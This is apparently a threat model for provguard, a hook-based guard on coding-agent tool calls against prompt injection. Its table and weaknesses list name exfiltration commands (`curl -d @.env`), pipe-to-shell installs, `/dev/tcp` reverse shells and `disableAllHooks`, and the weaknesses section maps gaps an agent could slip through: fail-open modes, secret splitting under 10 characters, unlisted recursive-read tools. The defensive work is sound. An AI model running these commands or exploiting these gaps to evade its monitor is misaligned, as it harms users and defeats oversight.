# Threat model

## What provguard is

A deterministic check that runs **outside the model**, on every tool call of a coding agent, through the agent's hook API. A prompt injection can change what the model *wants* to do. It cannot change what the hook *decides*.

## Assets

1. **Secrets** the agent can reach: `.env` files, SSH keys, cloud credentials, tokens in environment variables and tool output.
2. **The user's machine and repos:** shell startup files, git hooks, CI workflows, agent settings, branches and history.
3. **provguard itself:** its hooks, binary, config, keys and logs.

## Attacker

Someone who controls content that the agent reads, but not the user, the agent binary or the operating system:

- issue and PR text and comments, including hidden HTML comments;
- web pages fetched by the agent;
- files in third-party repos and dependencies (READMEs, docs, `CLAUDE.md`, `AGENTS.md`);
- output of third-party MCP servers;
- repo-level agent config (`.claude/settings.json`, `.mcp.json`).

## Attacker goals and coverage

| Goal | Example | provguard response |
|---|---|---|
| Exfiltrate secrets | `curl -d @.env`, `python -c` sockets, base64 or hex in URLs, DNS names | Deny when a seen secret appears in the call, or when an untrusted *and* sensitive session sends data out |
| Send data to an attacker host | `curl https://injected-host/…` | Ask when the host came from untrusted content |
| Persistence | `~/.bashrc`, `.git/hooks/`, `.github/workflows/`, `crontab`, `git remote add` | Ask after untrusted input |
| Remote code | `curl … \| sh`, named package installs, `npx` | Ask after untrusted input |
| Remote control | reverse shells over `/dev/tcp` | Always ask |
| Destruction | `rm -rf` outside the project, force-push to `main`, `gh repo delete` | Ask |
| Turn provguard off | edit hook settings, `disableAllHooks`, replace the binary, run `uninstall` | Deny in every profile |

## Out of scope

- **A malicious user**, or an attacker with code execution outside the agent. provguard runs with the user's rights.
- **A compromised agent binary or OS.**
- **Harmful code the agent writes that a human later merges.** provguard checks actions, not code quality.
- **Attacks that need no tool call**, for example the model lying to the user in chat.
- **Kernel-level isolation.** Use a sandbox or container as well; provguard complements it.

## Known weaknesses

1. **Repo settings can turn hooks off before any hook runs.** A cloned repo with `"disableAllHooks": true` in `.claude/settings.json` disables user-level hooks, provguard included ([F3](FINDINGS.md)). provguard cannot stop that once the repo is open. It warns when an agent clones such a repo (`git clone`), and `provguard doctor` finds it before you open a repo you cloned yourself. In teams, use managed settings (`allowManagedHooksOnly`).
2. **Auto-loaded instruction files are invisible to hooks.** `CLAUDE.md`, `AGENTS.md` and similar files enter the context without a tool call. At session start, provguard reads them in the repo root and the working folder: hidden text, a prompt-injection phrase, `disableAllHooks` or decode-and-run code marks the session untrusted (hidden text escalates to deny). It also marks the session untrusted when the repo's owner is not in `trusted_repo_owners`. Files that load later (a `CLAUDE.md` in a subfolder, or one changed during the session) and subtler injections are not caught.
3. **Static analysis has limits.** Values known only at run time cannot be resolved, and the PowerShell analysis is a heuristic. Unreadable code (`eval`, encoded commands, `python -c` writes, writes to computed paths) is treated as OPAQUE and asks after untrusted input. Script files run by a command (`python x.py`, `make`, `npm run`) are scanned for references to protected files, but not analyzed further.
3a. **Version-control updates are allowed.** `git pull`, `merge` or `switch` can change a tracked `.claude/settings.json`. Blocking them would break normal work; `ConfigChange` and `provguard doctor` report the change instead. Explicit `git checkout -- .claude/settings.json` is denied.
4. **Fail open by default.** In `audit`, a crashed or timed-out hook lets the call run. In `balanced`, so does a timed-out one, and so does a crash unless the session has read both untrusted content and secrets, which denies the call. Only `strict` fails closed on everything, through `"onFailure": "block"` on its PreToolUse hook; `provguard doctor` reports a hook whose setting no longer matches the profile.
5. **Taint is coarse.** Once a session is untrusted it stays untrusted, so long sessions can ask more often. `provguard reset` clears it after the user checks, all at once or one source at a time (`--source N`). URLs and hosts seen in untrusted content are not tied to a source, so they stay until the last source is cleared.
5a. **The key is readable by any program that runs as you.** provguard blocks every command and tool that names its folder, the key or the session files, including globs, run-time paths, `cd` into the folder, and MCP file servers. It also blocks recursive reads of a folder that holds its folder (`grep -r … ~`, `tar … ~`, `cp -r ~`, `rsync -a ~/`, `find ~ … -exec`, `find ~ | xargs`, `Get-ChildItem ~ -Recurse | Select-String`, `Compress-Archive ~`) unless they leave `.provguard` out (`--exclude-dir=.provguard`, `--exclude=.provguard`). Not covered: recursive reads by tools it does not list, and code that walks the folder (a script, `python -c`), where only a mention of provguard's files is checked. The key lets an agent compute the fingerprints of secrets; it cannot grant itself a blocked call, because `provguard allow` and writes to provguard's folder stay blocked.
6. **Secret matching has limits.** A secret is matched whole, and a random-looking secret also in pieces of 10 or more characters (plain, reversed, or base64, hex or URL encoded), so a secret sent out in parts is caught when each part has at least 10 characters. Smaller parts, other transformations (character by character, encryption, compression) and secrets that look like words are not matched.
7. **Coverage depends on the agent's hook API.** Claude Code is supported. Desktop Chat with MCP servers is not (no hooks).

## Trust anchors

- provguard's hooks are installed at user scope, and the binary lives in `~/.provguard/bin/`. Both are protected from agent writes.
- Configuration is written by the user only.
- Decisions are deterministic and logged with their reason in `~/.provguard/audit/`.
